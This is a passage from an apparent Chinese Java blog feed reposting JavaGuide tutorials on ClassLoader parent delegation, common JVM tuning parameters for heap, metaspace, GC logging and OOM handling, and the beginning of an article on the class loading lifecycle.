class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) {</span><br><span class="line">        <span class="comment">//首先，检查该类是否已经加载过</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) {</span><br><span class="line">            <span class="comment">//如果 c 为 null，则说明该类没有被加载过</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) {</span><br><span class="line">                    <span class="comment">//当父类的加载器不为空，则通过父类的loadClass来加载该类</span></span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="comment">//当父类的加载器为空，则调用启动类加载器来加载该类</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                <span class="comment">//非空父类的类加载器无法找到相应的类，则抛出异常</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) {</span><br><span class="line">                <span class="comment">//当父类加载器无法加载时，则调用findClass方法来加载该类</span></span><br><span class="line">                <span class="comment">//用户可通过覆写该方法，来自定义类加载器</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//用于统计类加载器相关的信息</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (resolve) {</span><br><span class="line">            <span class="comment">//对类进行link操作</span></span><br><span class="line">            resolveClass(c);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>每当一个类加载器接收到加载请求时，它会先将请求转发给父类加载器。在父类加载器没有找到所请求的类的情况下，该类加载器才会尝试去加载。</p><p>结合上面的源码，简单总结一下双亲委派模型的执行流程：</p><ul><li>在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载（每个父类加载器都会走一遍这个流程）。</li><li>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。这样的话，所有的请求最终都会传送到顶层的启动类加载器 <code>BootstrapClassLoader</code> 中。</li><li>只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载（调用自己的 <code>findClass()</code> 方法来加载类）。</li></ul><p>🌈 拓展一下：</p><p><strong>JVM 判定两个 Java 类是否相同的具体规则</strong>：JVM 不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样。只有两者都相同的情况，才认为两个类是相同的。即使两个类来源于同一个 <code>Class</code> 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相同。</p><h3 id="双亲委派模型的好处"><a href="#双亲委派模型的好处" class="headerlink" title="双亲委派模型的好处"></a>双亲委派模型的好处</h3><p>双亲委派模型保证了 Java 程序的稳定运行，可以避免类的重复加载（JVM 区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类），也保证了 Java 的核心 API 不被篡改。</p><p>如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个称为 <code>java.lang.Object</code> 类的话，那么程序运行的时候，系统就会出现两个不同的 <code>Object</code> 类。双亲委派模型可以保证加载的是 JRE 里的那个 <code>Object</code> 类，而不是你写的 <code>Object</code> 类。这是因为 <code>AppClassLoader</code> 在加载你的 <code>Object</code> 类时，会委托给 <code>ExtClassLoader</code> 去加载，而 <code>ExtClassLoader</code> 又会委托给 <code>BootstrapClassLoader</code>，<code>BootstrapClassLoader</code> 发现自己已经加载过了 <code>Object</code> 类，会直接返回，不会去加载你写的 <code>Object</code> 类。</p><h3 id="打破双亲委派模型方法"><a href="#打破双亲委派模型方法" class="headerlink" title="打破双亲委派模型方法"></a>打破双亲委派模型方法</h3><p><del>为了避免双亲委托机制，我们可以自己定义一个类加载器，然后重写 <code>loadClass()</code> 即可。</del></p><p><strong>🐛 修正（参见：<a href="https://github.com/Snailclimb/JavaGuide/issues/871">issue871</a> ）</strong>：自定义加载器的话，需要继承 <code>ClassLoader</code> 。如果我们不想打破双亲委派模型，就重写 <code>ClassLoader</code> 类中的 <code>findClass()</code> 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 <code>loadClass()</code> 方法。</p><p>为什么是重写 <code>loadClass()</code> 方法打破双亲委派模型呢？双亲委派模型的执行流程已经解释了：</p><blockquote><p>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。</p></blockquote><p>我们比较熟悉的 Tomcat 服务器为了能够优先加载 Web 应用目录下的类，然后再加载其他目录下的类，就自定义了类加载器 <code>WebAppClassLoader</code> 来打破双亲委托机制。这也是 Tomcat 下 Web 应用之间的类实现隔离的具体原理。</p><p>Tomcat 的类加载器的层次结构如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3182538063/tomcat-class-loader-parents-delegation-model.png" alt="Tomcat 的类加载器的层次结构"></p><p>感兴趣的小伙伴可以自行研究一下 Tomcat 类加载器的层次结构，这有助于我们搞懂 Tomcat 隔离 Web 应用的原理，推荐资料是<a href="http://gk.link/a/10Egr">《深入拆解 Tomcat &amp; Jetty》</a>。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2></li><li><p>《深入拆解 Java 虚拟机》</p></li><li><p>深入分析 Java ClassLoader 原理：<a href="https://blog.csdn.net/xyang81/article/details/7292380">https://blog.csdn.net/xyang81/article/details/7292380</a></p></li><li><p>Java 类加载器(ClassLoader)：<a href="http://gityuan.com/2016/01/24/java-classloader/">http://gityuan.com/2016/01/24/java-classloader/</a></p></li><li><p>Class Loaders in Java：<a href="https://www.baeldung.com/java-classloaders">https://www.baeldung.com/java-classloaders</a></p></li><li><p>Class ClassLoader - Oracle 官方文档：<a href="https://docs.oracle.com/javase/8/docs/api/java/lang/ClassLoader.html">https://docs.oracle.com/javase/8/docs/api/java/lang/ClassLoader.html</a></p></li><li><p>老大难的 Java ClassLoader 再不理解就老了：<a href="https://zhuanlan.zhihu.com/p/51374915">https://zhuanlan.zhihu.com/p/51374915</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最重要的JVM参数总结</title>
      <link href="/posts/1352723613/"/>
      <url>/posts/1352723613/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文由 JavaGuide 翻译自 <a href="https://www.baeldung.com/jvm-parameters">https://www.baeldung.com/jvm-parameters</a>，并对文章进行了大量的完善补充。</p><p>JDK 版本：1.8</p></blockquote><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>在本篇文章中，你将掌握最常用的 JVM 参数配置。</p><h2 id="2-堆内存相关"><a href="#2-堆内存相关" class="headerlink" title="2.堆内存相关"></a>2.堆内存相关</h2><blockquote><p>Java 虚拟机所管理的内存中最大的一块，Java 堆是所有线程共享的一块内存区域，在虚拟机启动时创建。<strong>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。</strong></p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1352723613/%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0.png" alt="内存区域常见配置参数"></p><h3 id="2-1-显式指定堆内存–Xms和-Xmx"><a href="#2-1-显式指定堆内存–Xms和-Xmx" class="headerlink" title="2.1.显式指定堆内存–Xms和-Xmx"></a>2.1.显式指定堆内存<code>–Xms</code>和<code>-Xmx</code></h3><p>与性能有关的最常见实践之一是根据应用程序要求初始化堆内存。如果我们需要指定最小和最大堆大小（推荐显示指定大小），以下参数可以帮助你实现：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Xms&lt;heap size&gt;[unit]</span><br><span class="line">-Xmx&lt;heap size&gt;[unit]</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>heap size</strong> 表示要初始化内存的具体大小。</li><li><strong>unit</strong> 表示要初始化内存的单位。单位为**<em>“ g”</em>** (GB)、**<em>“ m”</em><strong>（MB）、</strong><em>“ k”</em>**（KB）。</li></ul><p>举个栗子 🌰，如果我们要为 JVM 分配最小 2 GB 和最大 5 GB 的堆内存大小，我们的参数应该这样来写：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xms2G -Xmx5G</span><br></pre></td></tr></tbody></table></figure><h3 id="2-2-显式新生代内存-Young-Generation"><a href="#2-2-显式新生代内存-Young-Generation" class="headerlink" title="2.2.显式新生代内存(Young Generation)"></a>2.2.显式新生代内存(Young Generation)</h3><p>根据<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/gctuning/sizing.html">Oracle 官方文档</a>，在堆总可用内存配置完成之后，第二大影响因素是为 <code>Young Generation</code> 在堆内存所占的比例。默认情况下，YG 的最小大小为 1310 _MB_，最大大小为<em>无限制</em>。</p><p>一共有两种指定 新生代内存(Young Generation)大小的方法：</p><p><strong>1.通过<code>-XX:NewSize</code>和<code>-XX:MaxNewSize</code>指定</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:NewSize=&lt;young size&gt;[unit]</span><br><span class="line">-XX:MaxNewSize=&lt;young size&gt;[unit]</span><br></pre></td></tr></tbody></table></figure><p>举个栗子 🌰，如果我们要为 新生代分配 最小 256m 的内存，最大 1024m 的内存我们的参数应该这样来写：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:NewSize=256m</span><br><span class="line">-XX:MaxNewSize=1024m</span><br></pre></td></tr></tbody></table></figure><p><strong>2.通过<code>-Xmn&lt;young size&gt;[unit]</code>指定</strong></p><p>举个栗子 🌰，如果我们要为 新生代分配 256m 的内存（NewSize 与 MaxNewSize 设为一致），我们的参数应该这样来写：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xmn256m</span><br></pre></td></tr></tbody></table></figure><p>GC 调优策略中很重要的一条经验总结是这样说的：</p><blockquote><p>将新对象预留在新生代，由于 Full GC 的成本远高于 Minor GC，因此尽可能将对象分配在新生代是明智的做法，实际项目中根据 GC 日志分析新生代空间大小分配是否合理，适当通过“-Xmn”命令调节新生代大小，最大限度降低新对象直接进入老年代的情况。</p></blockquote><p>另外，你还可以通过 <strong><code>-XX:NewRatio=&lt;int&gt;</code></strong> 来设置老年代与新生代内存的比值。</p><p>比如下面的参数就是设置老年代与新生代内存的比值为 1。也就是说老年代和新生代所占比值为 1：1，新生代占整个堆栈的 1/2。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:NewRatio=1</span><br></pre></td></tr></tbody></table></figure><h3 id="2-3-显式指定永久代-元空间的大小"><a href="#2-3-显式指定永久代-元空间的大小" class="headerlink" title="2.3.显式指定永久代/元空间的大小"></a>2.3.显式指定永久代/元空间的大小</h3><p><strong>从 Java 8 开始，如果我们没有指定 Metaspace 的大小，随着更多类的创建，虚拟机会耗尽所有可用的系统内存（永久代并不会出现这种情况）。</strong></p><p>JDK 1.8 之前永久代还没被彻底移除的时候通常通过下面这些参数来调节方法区大小</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:PermSize=N <span class="comment">#方法区 (永久代) 初始大小</span></span><br><span class="line">-XX:MaxPermSize=N <span class="comment">#方法区 (永久代) 最大大小,超过这个值将会抛出 OutOfMemoryError 异常:java.lang.OutOfMemoryError: PermGen</span></span><br></pre></td></tr></tbody></table></figure><p>相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入方法区后就“永久存在”了。</p><p><strong>JDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是本地内存。</strong></p><p>下面是一些常用参数：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:MetaspaceSize=N <span class="comment">#设置 Metaspace 的初始大小（是一个常见的误区，后面会解释）</span></span><br><span class="line">-XX:MaxMetaspaceSize=N <span class="comment">#设置 Metaspace 的最大大小</span></span><br></pre></td></tr></tbody></table></figure><p><strong>🐛 修正（参见：<a href="https://github.com/Snailclimb/JavaGuide/issues/1947">issue#1947</a>）</strong>：</p><p>1、Metaspace 的初始容量并不是 <code>-XX:MetaspaceSize</code> 设置，无论 <code>-XX:MetaspaceSize</code> 配置什么值，对于 64 位 JVM 来说，Metaspace 的初始容量都是 21807104（约 20.8m）。</p><p>可以参考 Oracle 官方文档 <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/gctuning/considerations.html">Other Considerations</a> 中提到的：</p><blockquote><p>Specify a higher value for the option MetaspaceSize to avoid early garbage collections induced for class metadata. The amount of class metadata allocated for an application is application-dependent and general guidelines do not exist for the selection of MetaspaceSize. The default size of MetaspaceSize is platform-dependent and ranges from 12 MB to about 20 MB.</p><p>MetaspaceSize 的默认大小取决于平台，范围从 12 MB 到大约 20 MB。</p></blockquote><p>另外，还可以看一下这个试验：<a href="https://mp.weixin.qq.com/s/jqfppqqd98DfAJHZhFbmxA">JVM 参数 MetaspaceSize 的误解</a>。</p><p>2、Metaspace 由于使用不断扩容到<code>-XX:MetaspaceSize</code>参数指定的量，就会发生 FGC，且之后每次 Metaspace 扩容都会发生 Full GC。</p><p>也就是说，MetaspaceSize 表示 Metaspace 使用过程中触发 Full GC 的阈值，只对触发起作用。</p><p>垃圾搜集器内部是根据变量 <code>_capacity_until_GC</code>来判断 Metaspace 区域是否达到阈值的，初始化代码如下所示：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MetaspaceGC::initialize</span><span class="params">()</span> {</span><br><span class="line">  <span class="comment">// Set the high-water mark to MaxMetapaceSize during VM initializaton since</span></span><br><span class="line">  <span class="comment">// we can't do a GC during initialization.</span></span><br><span class="line">  _capacity_until_GC = MaxMetaspaceSize;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>相关阅读：<a href="https://github.com/Snailclimb/JavaGuide/issues/1204">issue 更正：MaxMetaspaceSize 如果不指定大小的话，不会耗尽内存 #1204 </a> 。</p><h2 id="3-垃圾收集相关"><a href="#3-垃圾收集相关" class="headerlink" title="3.垃圾收集相关"></a>3.垃圾收集相关</h2><h3 id="3-1-垃圾回收器"><a href="#3-1-垃圾回收器" class="headerlink" title="3.1.垃圾回收器"></a>3.1.垃圾回收器</h3><p>为了提高应用程序的稳定性，选择正确的<a href="http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/gc01/index.html">垃圾收集</a>算法至关重要。</p><p>JVM 具有四种类型的 GC 实现：</p><ul><li>串行垃圾收集器</li><li>并行垃圾收集器</li><li>CMS 垃圾收集器</li><li>G1 垃圾收集器</li></ul><p>可以使用以下参数声明这些实现：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UseSerialGC</span><br><span class="line">-XX:+UseParallelGC</span><br><span class="line">-XX:+UseParNewGC</span><br><span class="line">-XX:+UseG1GC</span><br></pre></td></tr></tbody></table></figure><p>有关<em>垃圾回收</em>实施的更多详细信息，请参见<a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/java/jvm/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.md">此处</a>。</p><h3 id="3-2-GC-日志记录"><a href="#3-2-GC-日志记录" class="headerlink" title="3.2.GC 日志记录"></a>3.2.GC 日志记录</h3><p>生产环境上，或者其他要测试 GC 问题的环境上，一定会配置上打印 GC 日志的参数，便于分析 GC 相关的问题。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必选</span></span><br><span class="line"><span class="comment"># 打印基本 GC 信息</span></span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line"><span class="comment"># 打印对象分布</span></span><br><span class="line">-XX:+PrintTenuringDistribution</span><br><span class="line"><span class="comment"># 打印堆数据</span></span><br><span class="line">-XX:+PrintHeapAtGC</span><br><span class="line"><span class="comment"># 打印Reference处理信息</span></span><br><span class="line"><span class="comment"># 强引用/弱引用/软引用/虚引用/finalize 相关的方法</span></span><br><span class="line">-XX:+PrintReferenceGC</span><br><span class="line"><span class="comment"># 打印STW时间</span></span><br><span class="line">-XX:+PrintGCApplicationStoppedTime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选</span></span><br><span class="line"><span class="comment"># 打印safepoint信息，进入 STW 阶段之前，需要要找到一个合适的 safepoint</span></span><br><span class="line">-XX:+PrintSafepointStatistics</span><br><span class="line">-XX:PrintSafepointStatisticsCount=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># GC日志输出的文件路径</span></span><br><span class="line">-Xloggc:/path/to/gc-%t.log</span><br><span class="line"><span class="comment"># 开启日志文件分割</span></span><br><span class="line">-XX:+UseGCLogFileRotation</span><br><span class="line"><span class="comment"># 最多分割几个文件，超过之后从头文件开始写</span></span><br><span class="line">-XX:NumberOfGCLogFiles=14</span><br><span class="line"><span class="comment"># 每个文件上限大小，超过就触发分割</span></span><br><span class="line">-XX:GCLogFileSize=50M</span><br></pre></td></tr></tbody></table></figure><h2 id="4-处理-OOM"><a href="#4-处理-OOM" class="headerlink" title="4.处理 OOM"></a>4.处理 OOM</h2><p>对于大型应用程序来说，面对内存不足错误是非常常见的，这反过来会导致应用程序崩溃。这是一个非常关键的场景，很难通过复制来解决这个问题。</p><p>这就是为什么 JVM 提供了一些参数，这些参数将堆内存转储到一个物理文件中，以后可以用来查找泄漏:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line">-XX:HeapDumpPath=./java_pid&lt;pid&gt;.hprof</span><br><span class="line">-XX:OnOutOfMemoryError=<span class="string">"&lt; cmd args &gt;;&lt; cmd args &gt;"</span></span><br><span class="line">-XX:+UseGCOverheadLimit</span><br></pre></td></tr></tbody></table></figure><p>这里有几点需要注意:</p><ul><li><strong>HeapDumpOnOutOfMemoryError</strong> 指示 JVM 在遇到 <strong>OutOfMemoryError</strong> 错误时将 heap 转储到物理文件中。</li><li><strong>HeapDumpPath</strong> 表示要写入文件的路径; 可以给出任何文件名; 但是，如果 JVM 在名称中找到一个 <code>&lt;pid&gt;</code> 标记，则当前进程的进程 id 将附加到文件名中，并使用<code>.hprof</code>格式</li><li><strong>OnOutOfMemoryError</strong> 用于发出紧急命令，以便在内存不足的情况下执行; 应该在 <code>cmd args</code> 空间中使用适当的命令。例如，如果我们想在内存不足时重启服务器，我们可以设置参数: <code>-XX:OnOutOfMemoryError="shutdown -r"</code> 。</li><li><strong>UseGCOverheadLimit</strong> 是一种策略，它限制在抛出 OutOfMemory 错误之前在 GC 中花费的 VM 时间的比例</li></ul><h2 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h2><ul><li><code>-server</code> : 启用“ Server Hotspot VM”; 此参数默认用于 64 位 JVM</li><li><code>-XX:+UseStringDeduplication</code> : <em>Java 8u20</em> 引入了这个 JVM 参数，通过创建太多相同 String 的实例来减少不必要的内存使用; 这通过将重复 String 值减少为单个全局 <code>char []</code> 数组来优化堆内存。</li><li><code>-XX:+UseLWPSynchronization</code>: 设置基于 LWP (轻量级进程)的同步策略，而不是基于线程的同步。</li><li>``-XX:LargePageSizeInBytes `: 设置用于 Java 堆的较大页面大小; 它采用 GB/MB/KB 的参数; 页面大小越大，我们可以更好地利用虚拟内存硬件资源; 然而，这可能会导致 PermGen 的空间大小更大，这反过来又会迫使 Java 堆空间的大小减小。</li><li><code>-XX:MaxHeapFreeRatio</code> : 设置 GC 后, 堆空闲的最大百分比，以避免收缩。</li><li><code>-XX:SurvivorRatio</code> : eden/survivor 空间的比例, 例如<code>-XX:SurvivorRatio=6</code> 设置每个 survivor 和 eden 之间的比例为 1:6。</li><li><code>-XX:+UseLargePages</code> : 如果系统支持，则使用大页面内存; 请注意，如果使用这个 JVM 参数，OpenJDK 7 可能会崩溃。</li><li><code>-XX:+UseStringCache</code> : 启用 String 池中可用的常用分配字符串的缓存。</li><li><code>-XX:+UseCompressedStrings</code> : 对 String 对象使用 <code>byte []</code> 类型，该类型可以用纯 ASCII 格式表示。</li><li><code>-XX:+OptimizeStringConcat</code> : 它尽可能优化字符串串联操作。<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2></li><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a><h2 id="文章推荐"><a href="#文章推荐" class="headerlink" title="文章推荐"></a>文章推荐</h2></li></ul><p>这里推荐了非常多优质的 JVM 实践相关的文章，推荐阅读，尤其是 JVM 性能优化和问题排查相关的文章。</p><ul><li><a href="https://help.aliyun.com/document_detail/148851.html">JVM 参数配置说明 - 阿里云官方文档 - 2022</a></li><li><a href="https://help.aliyun.com/document_detail/383255.html">JVM 内存配置最佳实践 - 阿里云官方文档 - 2022</a></li><li><a href="https://segmentfault.com/a/1190000039806436">求你了，GC 日志打印别再瞎配置了 - 思否 - 2022</a></li><li><a href="https://juejin.cn/post/7078624931826794503">一次大量 JVM Native 内存泄露的排查分析（64M 问题） - 掘金 - 2022</a></li><li><a href="https://heapdump.cn/article/1859160">一次线上 JVM 调优实践，FullGC40 次/天到 10 天一次的优化过程 - HeapDump - 2021</a></li><li><a href="https://shuyi.tech/archives/have-a-try-in-jvm-combat">听说 JVM 性能优化很难？今天我小试了一把！ - 陈树义 - 2021</a></li><li><a href="https://mp.weixin.qq.com/s/df1uxHWUXzhErxW1sZ6OvQ">你们要的线上 GC 问题案例来啦 - 编了个程 - 2021</a></li><li><a href="https://tech.meituan.com/2020/11/12/java-9-cms-gc.html">Java 中 9 种常见的 CMS GC 问题分析与解决 - 美团技术团队 - 2020</a></li><li><a href="https://tech.meituan.com/2017/12/29/jvm-optimize.html">从实际案例聊聊 Java 应用的 GC 优化-美团技术团队 - 美团技术团队 - 2017</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类加载过程详解</title>
      <link href="/posts/407384776/"/>
      <url>/posts/407384776/</url>
      
        <content type="html"><![CDATA[<h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><p>类从被加载到虚拟机内存中开始到卸载出内存为止，它的整个生命周期可以简单概括为 7 个阶段：：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（Initialization）、使用（Using）和卸载（Unloading）。其中，前三个阶段可以统称为连接（Linking）。</p><p>这 7 个阶段的顺序如下图所示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/407384776/lifecycle-of-a-class.png" alt="一个类的完整生命周期"></p><h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p><strong>Class 文件需要加载到虚拟机中之后才能运行和使用，那么虚拟机是如何加载这些 Class 文件呢？</strong></p><p>系统加载 Class 类型的文件主要三步：<strong>加载-&gt;连接-&gt;初始化</strong>。连接过程又可分为三步：<strong>验证-&gt;准备-&gt;解析</strong>。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/407384776/class-loading-procedure.png" alt="类加载过程"></p><p>详见 <a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-5.html#jvms-5.3" title="Java Virtual Machine Specification - 5.3. Creation and Loading">Java Virtual Machine Specification - 5.3. Creation and Loading</a>。</p><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>类加载过程的第一步，主要完成下面 3 件事情：</p><ol><li>通过全类名获取定义此类的二进制字节流。</li><li>将字节流所代表的静态存储结构转换为方法区的运行时数据结构。</li><li>在内存中生成一个代表该类的 <code>Class</code> 对象，作为方法区这些数据的访问入口。</li></ol><p>虚拟机规范上面这 3 点并不具体，因此是非常灵活的。比如：”通过全类名获取定义此类的二进制字节流” 并没有指明具体从哪里获取（ <code>ZIP</code>、 <code>JAR</code>、<code>EAR</code>、<code>WAR</code>、网络、动态代理技术运行时动态生成、其他文件生成比如 <code>JSP</code>…）、怎样获取。</p><p>加载这一步主要是通过我们后面要讲到的 <strong>类加载器</strong> 完成的。类加载器有很多种，当我们想要加载一个类的时候，具体是哪个类加载器加载由 <strong>双亲委派模型</strong> 决定（不过，我们也能打破由双亲委派模型）。</p><blockquote><p>类加载器、双亲委派模型也是非常重要的知识点，这部分内容在<a href="https://javaguide.cn/java/jvm/classloader.html" title="类加载器详解">类加载器详解</a>这篇文章中有详细介绍到。阅读本篇文章的时候，大家知道有这么个东西就可以了。</p></blockquote><p>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p><p>一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的 <code>loadClass()</code> 方法）。</p><p>加载阶段与连接阶段的部分动作(如一部分字节码文件格式验证动作)是交叉进行的，加载阶段尚未结束，连接阶段可能就已经开始了。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><strong>验证是连接阶段的第一步，这一阶段的目的是确保 Class 